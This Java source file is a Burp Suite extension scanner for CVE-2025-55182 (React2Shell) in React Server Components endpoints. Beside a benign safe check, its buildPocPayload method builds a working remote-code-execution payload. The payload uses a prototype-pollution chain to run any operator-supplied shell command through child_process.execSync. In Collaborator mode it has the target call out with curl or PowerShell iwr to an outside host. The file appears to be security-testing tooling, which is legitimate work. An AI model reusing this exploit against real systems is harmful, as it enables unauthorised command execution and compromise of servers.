package burp.scanner;

import burp.IBurpExtenderCallbacks;
import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IHttpService;
import burp.IRequestInfo;
import burp.IResponseInfo;
import burp.model.ScanOptions;
import burp.model.ScanResult;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.TimeUnit;

/**
 * Performs the HTTP checks that detect CVE-2025-55182 (React2Shell).
 *
 * <h3>Thread-safety notes</h3>
 * <ul>
 *   <li>{@link #scheduledExecutor} is used only for Collaborator polling and
 *       is created with a daemon thread so it does not prevent JVM/Burp
 *       shutdown. It must be shut down explicitly via {@link #shutdown()} when
 *       the extension is unloaded.</li>
 *   <li>{@link #scan} may be called concurrently from multiple Burp scanner
 *       threads; the method is stateless (all mutable state is local).</li>
 * </ul>
 */
public class React2ShellScanner {

    private final IBurpExtenderCallbacks callbacks;
    private final IExtensionHelpers helpers;
    private final Random random = new Random();

    /**
     * Issue 3: single-thread scheduled executor used for deferred Collaborator
     * interaction polling. Using a daemon thread ensures the executor does not
     * prevent Burp from shutting down if {@link #shutdown()} is somehow missed.
     */
    private final ScheduledExecutorService scheduledExecutor =
            Executors.newSingleThreadScheduledExecutor(new ThreadFactory() {
                @Override
                public Thread newThread(Runnable r) {
                    Thread t = new Thread(r, "react2shell-collaborator-poller");
                    t.setDaemon(true);
                    return t;
                }
            });

    /** Recommended Collaborator polling delay in seconds (covers DNS propagation). */
    private static final long COLLABORATOR_POLL_DELAY_SECONDS = 60L;

    public React2ShellScanner(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
        this.callbacks = callbacks;
        this.helpers = helpers;
    }

    /**
     * Shuts down the internal scheduled executor. Must be called from
     * {@code React2ShellTab.shutdown()}, which is itself called from
     * {@code React2ShellExtension.extensionUnloaded()}.
     */
    public void shutdown() {
        scheduledExecutor.shutdownNow();
    }

    /**
     * Executes a scan against the provided service and path using the given options.
     */
    public ScanResult scan(IHttpService service, String basePath, ScanOptions options) {
        String pathToTest = options.getPath() != null ? options.getPath() : "/";
        if (pathToTest.trim().isEmpty()) {
            pathToTest = "/";
        }

        IBurpCollaboratorClientContext collaboratorContext = null;
        String collaboratorPayload = null;
        if (options.isUseCollaborator() && options.getMode() == ScanOptions.Mode.POC_REDIRECT) {
            try {
                collaboratorContext = callbacks.createBurpCollaboratorClientContext();
                if (collaboratorContext != null) {
                    collaboratorPayload = collaboratorContext.generatePayload(true);
                }
            } catch (Exception ignored) {
            }
        }

        long started = System.nanoTime();
        try {
            Attempt firstAttempt = sendOnce(service, pathToTest, options, collaboratorPayload);
            if (firstAttempt == null) {
                return new ScanResult(false, true, "Request failed to send", null,
                        elapsedMs(started), -1, null, pathToTest, options.getCommand(), false, null);
            }
            if (firstAttempt.vulnerable || !options.isFollowRedirects()
                    || firstAttempt.redirectLocation == null) {
                scheduleCollaboratorCheck(firstAttempt, collaboratorContext, collaboratorPayload);
                return toResult(firstAttempt, started, pathToTest, firstAttempt.commandUsed);
            }

            // Follow same-host redirects if requested.
            IHttpService redirectService = deriveServiceFromLocation(service, firstAttempt.redirectLocation);
            String redirectPath = derivePathFromLocation(firstAttempt.redirectLocation);
            Attempt redirectedAttempt = sendOnce(redirectService, redirectPath, options, collaboratorPayload);
            if (redirectedAttempt == null) {
                scheduleCollaboratorCheck(firstAttempt, collaboratorContext, collaboratorPayload);
                return toResult(firstAttempt, started, pathToTest, firstAttempt.commandUsed);
            }
            scheduleCollaboratorCheck(redirectedAttempt, collaboratorContext, collaboratorPayload);
            return toResult(redirectedAttempt, started, redirectPath, redirectedAttempt.commandUsed);
        } catch (Exception e) {
            return new ScanResult(false, true, "Unexpected error: " + e.getMessage(), null,
                    elapsedMs(started), -1, null, pathToTest, options.getCommand(), false, null);
        }
    }

    /**
     * Builds a passive-only fingerprint from the given response.
     *
     * <h3>Issue 6 – body allocation order</h3>
     * The response body is now read <em>only after</em> the header loop
     * completes without a match. For the majority of proxied responses (which
     * are not RSC traffic), the header loop fails early and the body string is
     * never allocated, eliminating the unnecessary allocation that occurred on
     * every call in the original code.
     */
    public boolean looksLikeRscEndpoint(IHttpRequestResponse message) {
        if (message == null || message.getResponse() == null) {
            return false;
        }
        IResponseInfo responseInfo = helpers.analyzeResponse(message.getResponse());

        // Issue 6: run the header loop first — return true immediately on match
        // without ever allocating the body string.
        for (String header : responseInfo.getHeaders()) {
            String lower = header.toLowerCase(Locale.ROOT);
            if (lower.startsWith("content-type:") && lower.contains("text/x-component")) {
                return true;
            }
            if (lower.startsWith("x-action-redirect:")
                    || lower.startsWith("rsc-action-id:")
                    || lower.startsWith("next-action:")) {
                return true;
            }
        }

        // Only allocate the body string when no header matched.
        String body = getBodyAsString(message.getResponse(), responseInfo);
        return body.contains("\"resolved_model\"") || body.contains("$@");
    }

    // -----------------------------------------------------------------------
    // Internal helpers
    // -----------------------------------------------------------------------

    private ScanResult toResult(Attempt attempt, long started, String path, String commandUsed) {
        long duration = elapsedMs(started);
        if (attempt.errored) {
            return new ScanResult(false, true, attempt.message, attempt.requestResponse,
                    duration, attempt.statusCode, attempt.evidence, path,
                    commandUsed, attempt.collaboratorHit, attempt.collaboratorEvidence);
        }
        return new ScanResult(attempt.vulnerable, false, attempt.message, attempt.requestResponse,
                duration, attempt.statusCode, attempt.evidence, path,
                commandUsed, attempt.collaboratorHit, attempt.collaboratorEvidence);
    }

    private Attempt sendOnce(IHttpService service, String path, ScanOptions options,
                              String collaboratorPayload) {
        String commandToUse = options.getCommand();
        if (options.isUseCollaborator() && options.getMode() == ScanOptions.Mode.POC_REDIRECT
                && collaboratorPayload != null) {
            if (options.isWindowsPayload()) {
                commandToUse = "powershell -c \"iwr https://" + collaboratorPayload + "\"";
            } else {
                commandToUse = "curl https://" + collaboratorPayload;
            }
        }

        Payload payload = options.getMode() == ScanOptions.Mode.SAFE_CHECK
                ? buildSafePayload()
                : buildPocPayload(options.isWindowsPayload(), commandToUse);

        List<String> headers = buildHeaders(service, path, payload.contentType,
                payload.body.length, options.getExtraHeaders());
        byte[] request = helpers.buildHttpMessage(headers, payload.body);

        IHttpRequestResponse message = callbacks.makeHttpRequest(service, request);
        if (message == null || message.getResponse() == null) {
            return new Attempt(false, true, "No response (timeout?)", null, -1,
                    null, null, commandToUse, false, null);
        }

        IResponseInfo responseInfo = helpers.analyzeResponse(message.getResponse());
        String body = getBodyAsString(message.getResponse(), responseInfo);
        boolean vulnerable = isVulnerable(responseInfo, body, options.getMode(), commandToUse);

        String redirectLocation = getHeaderValue(responseInfo.getHeaders(), "Location");
        String evidence = buildEvidence(responseInfo, body, options.getMode(), commandToUse);
        String msg = vulnerable
                ? "Endpoint appears vulnerable to React2Shell (CVE-2025-55182)."
                : "No vulnerable behavior observed.";

        IHttpRequestResponse persistent = callbacks.saveBuffersToTempFiles(message);
        return new Attempt(vulnerable, false, msg, persistent, responseInfo.getStatusCode(),
                redirectLocation, evidence, commandToUse, false, null);
    }

    private List<String> buildHeaders(IHttpService service, String path, String contentType,
                                       int contentLength, Map<String, String> extraHeaders) {
        List<String> headers = new ArrayList<>();
        String normalizedPath = path.startsWith("/") ? path : "/" + path;
        headers.add("POST " + normalizedPath + " HTTP/1.1");
        headers.add("Host: " + service.getHost());
        headers.add("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 react2shellburp/0.1");
        headers.add("Accept: */*");
        headers.add("Content-Type: " + contentType);
        headers.add("Content-Length: " + contentLength);
        headers.add("Next-Action: x");
        headers.add("X-Nextjs-Request-Id: " + randomHex(8));
        headers.add("X-Nextjs-Html-Request-Id: " + randomHex(12));
        headers.add("Connection: close");

        if (extraHeaders != null && !extraHeaders.isEmpty()) {
            for (Map.Entry<String, String> entry : extraHeaders.entrySet()) {
                removeHeader(headers, entry.getKey());
                headers.add(entry.getKey() + ": " + entry.getValue());
            }
        }
        return headers;
    }

    private boolean isVulnerable(IResponseInfo responseInfo, String body,
                                   ScanOptions.Mode mode, String command) {
        if (responseInfo == null) {
            return false;
        }
        switch (mode) {
            case SAFE_CHECK:
                if (responseInfo.getStatusCode() != 500) {
                    return false;
                }
                if (!body.contains("E{\"digest\"")) {
                    return false;
                }
                // Ignore known mitigations to avoid false positives.
                String serverHeader = getHeaderValue(responseInfo.getHeaders(), "Server");
                boolean netlifyMitigated = hasHeader(responseInfo.getHeaders(), "Netlify-Vary");
                if (serverHeader != null) {
                    String serverLower = serverHeader.toLowerCase(Locale.ROOT);
                    if (serverLower.contains("vercel") || serverLower.contains("netlify")) {
                        return false;
                    }
                }
                return !netlifyMitigated;
            case POC_REDIRECT:
                String redirectHeader = getHeaderValue(responseInfo.getHeaders(), "X-Action-Redirect");
                if (redirectHeader == null) {
                    return false;
                }
                // Default math command returns 11111; otherwise just require a redirect action.
                if (command != null && command.contains("41*271") && !redirectHeader.contains("11111")) {
                    return false;
                }
                return redirectHeader.contains("/login?a=");
            default:
                return false;
        }
    }

    private String buildEvidence(IResponseInfo responseInfo, String body,
                                  ScanOptions.Mode mode, String command) {
        if (responseInfo == null) {
            return null;
        }
        switch (mode) {
            case SAFE_CHECK:
                if (responseInfo.getStatusCode() == 500 && body.contains("E{\"digest\"")) {
                    return "500 + E{\"digest\" in body suggests unsafe deserialization path.";
                }
                break;
            case POC_REDIRECT:
                String redirectHeader = getHeaderValue(responseInfo.getHeaders(), "X-Action-Redirect");
                if (redirectHeader != null && redirectHeader.contains("/login?a=")) {
                    return "X-Action-Redirect: " + redirectHeader;
                }
                break;
            default:
                break;
        }
        return null;
    }

    private Payload buildSafePayload() {
        String boundary = boundary();
        String body =
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"1\"\r\n\r\n" +
                "{}\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"0\"\r\n\r\n" +
                "[\"$1:aa:aa\"]\r\n" +
                "--" + boundary + "--";
        return new Payload(body.getBytes(StandardCharsets.UTF_8),
                "multipart/form-data; boundary=" + boundary);
    }

    private Payload buildPocPayload(boolean windows, String command) {
        String boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
        String cmd = command == null || command.trim().isEmpty()
                ? (windows ? "powershell -c \"echo 11111\"" : "echo $((41*271))")
                : command.trim();

        // Mimic script.sh: collapse newlines to pipe-separated so it survives the redirect header.
        String sanitizedCmd = cmd.replace("\\", "\\\\").replace("'", "\\'");
        String prefixPayload =
                "var res=process.mainModule.require('child_process').execSync('" + sanitizedCmd + "')"
                + ".toString().trim().replace(/\\\\n/g,' | ');;throw Object.assign(new Error('NEXT_REDIRECT'),"
                + "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});";
        String part0 = "{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,"
                + "\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\""
                + prefixPayload
                + "\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}";

        StringBuilder body = new StringBuilder();
        body.append("--").append(boundary).append("\r\n");
        body.append("Content-Disposition: form-data; name=\"0\"\r\n\r\n");
        body.append(part0).append("\r\n");

        body.append("--").append(boundary).append("\r\n");
        body.append("Content-Disposition: form-data; name=\"1\"\r\n\r\n");
        body.append("\"$@0\"").append("\r\n");

        body.append("--").append(boundary).append("\r\n");
        body.append("Content-Disposition: form-data; name=\"2\"\r\n\r\n");
        body.append("[]").append("\r\n");

        body.append("--").append(boundary).append("--");

        return new Payload(body.toString().getBytes(StandardCharsets.UTF_8),
                "multipart/form-data; boundary=" + boundary);
    }

    // -----------------------------------------------------------------------
    // Collaborator – non-blocking scheduled check (Issue 3)
    // -----------------------------------------------------------------------

    /**
     * Schedules a deferred Collaborator interaction poll instead of blocking
     * the calling thread with {@code Thread.sleep}.
     *
     * <p>Previously, {@code Thread.sleep(options.getCollaboratorWaitSeconds() * 1000L)}
     * was called directly. When triggered from {@code doActiveScan}, the
     * calling thread is one of Burp's internal scanner threads. A 6-second
     * sleep (the prior default) could stall concurrent scan throughput, and
     * 6 seconds is far below the 30–60 seconds typically required for DNS
     * propagation and Collaborator callback delivery.</p>
     *
     * <p>This method returns immediately. The scheduled task fires after
     * {@value #COLLABORATOR_POLL_DELAY_SECONDS} seconds, fetches interactions,
     * and calls {@link IBurpExtenderCallbacks#addScanIssue} if a hit is
     * confirmed. The initial {@link ScanResult} already returned to Burp is
     * left unchanged; the deferred issue appears as a separate (additional)
     * finding.</p>
     */
    private void scheduleCollaboratorCheck(Attempt attempt,
                                            IBurpCollaboratorClientContext collaboratorContext,
                                            String payload) {
        if (collaboratorContext == null || payload == null) {
            return;
        }

        // Capture a snapshot of the fields we need in the scheduled lambda.
        final IHttpRequestResponse rr = attempt.requestResponse;
        final String evidence0 = attempt.evidence;

        scheduledExecutor.schedule(() -> {
            try {
                List<IBurpCollaboratorInteraction> interactions =
                        collaboratorContext.fetchAllCollaboratorInteractions();
                Set<String> hits = new HashSet<>();
                String[] props = {"interaction_id", "protocol", "client_ip",
                                  "request", "response", "query_type"};
                for (IBurpCollaboratorInteraction interaction : interactions) {
                    for (String name : props) {
                        String value = interaction.getProperty(name);
                        if (value != null && value.contains(payload)) {
                            hits.add(name + ": " + value);
                        }
                    }
                }
                if (!hits.isEmpty()) {
                    String collabEvidence = "Collaborator hit for payload " + payload
                            + " -> " + String.join("; ", hits);
                    String combinedEvidence = evidence0 != null
                            ? evidence0 + " | " + collabEvidence
                            : collabEvidence;
                    ScanResult confirmedResult = new ScanResult(
                            true, false,
                            "Endpoint confirmed vulnerable via Collaborator callback.",
                            rr, 0L, -1, combinedEvidence, null, null, true, collabEvidence);
                    callbacks.addScanIssue(
                            new burp.React2ShellIssue(rr, helpers, confirmedResult));
                }
            } catch (Exception e) {
                // Issue 7a: log failures instead of silently discarding them.
                callbacks.printError(
                        "React2Shell Collaborator poll failed: " + e.getMessage());
            }
        }, COLLABORATOR_POLL_DELAY_SECONDS, TimeUnit.SECONDS);
    }

    // -----------------------------------------------------------------------
    // Utility helpers
    // -----------------------------------------------------------------------

    private IHttpService deriveServiceFromLocation(IHttpService baseService, String location) {
        // If the location is absolute, honour scheme/port if present.
        try {
            java.net.URL url = new java.net.URL(
                    location.startsWith("http")
                            ? location
                            : baseService.getProtocol() + "://" + baseService.getHost() + location);
            boolean https = url.getProtocol().equalsIgnoreCase("https");
            int port = url.getPort() == -1 ? (https ? 443 : 80) : url.getPort();
            return helpers.buildHttpService(url.getHost(), port, https);
        } catch (Exception e) {
            return baseService;
        }
    }

    private String derivePathFromLocation(String location) {
        try {
            java.net.URL url = new java.net.URL(location);
            return url.getFile().isEmpty() ? "/" : url.getFile();
        } catch (Exception e) {
            // If relative, return as-is.
            return location.startsWith("/") ? location : "/" + location;
        }
    }

    private String getBodyAsString(byte[] message, IResponseInfo info) {
        if (message == null || info == null) {
            return "";
        }
        int offset = info.getBodyOffset();
        if (offset >= message.length) {
            return "";
        }
        return new String(message, offset, message.length - offset, StandardCharsets.ISO_8859_1);
    }

    private String getHeaderValue(List<String> headers, String name) {
        for (String header : headers) {
            int colon = header.indexOf(':');
            if (colon == -1) {
                continue;
            }
            String key = header.substring(0, colon).trim();
            if (key.equalsIgnoreCase(name)) {
                return header.substring(colon + 1).trim();
            }
        }
        return null;
    }

    private boolean hasHeader(List<String> headers, String name) {
        return getHeaderValue(headers, name) != null;
    }

    private void removeHeader(List<String> headers, String name) {
        headers.removeIf(h -> h.toLowerCase(Locale.ROOT).startsWith(
                name.toLowerCase(Locale.ROOT) + ":"));
    }

    private String boundary() {
        return "----React2Shell" + Math.abs(random.nextInt());
    }

    private String randomHex(int bytes) {
        byte[] data = new byte[bytes];
        random.nextBytes(data);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(data);
    }

    private long elapsedMs(long started) {
        return Math.max(1, (System.nanoTime() - started) / 1_000_000);
    }

    // -----------------------------------------------------------------------
    // Inner types
    // -----------------------------------------------------------------------

    private static final class Payload {
        private final byte[] body;
        private final String contentType;

        Payload(byte[] body, String contentType) {
            this.body = body;
            this.contentType = contentType;
        }
    }

    private static final class Attempt {
        private boolean vulnerable;
        private final boolean errored;
        private final String message;
        private final IHttpRequestResponse requestResponse;
        private final int statusCode;
        private final String redirectLocation;
        private String evidence;
        private final String commandUsed;
        private boolean collaboratorHit;
        private String collaboratorEvidence;

        Attempt(boolean vulnerable, boolean errored, String message,
                IHttpRequestResponse requestResponse, int statusCode,
                String redirectLocation, String evidence, String commandUsed,
                boolean collaboratorHit, String collaboratorEvidence) {
            this.vulnerable = vulnerable;
            this.errored = errored;
            this.message = message;
            this.requestResponse = requestResponse;
            this.statusCode = statusCode;
            this.redirectLocation = redirectLocation;
            this.evidence = evidence;
            this.commandUsed = commandUsed;
            this.collaboratorHit = collaboratorHit;
            this.collaboratorEvidence = collaboratorEvidence;
        }
    }
}
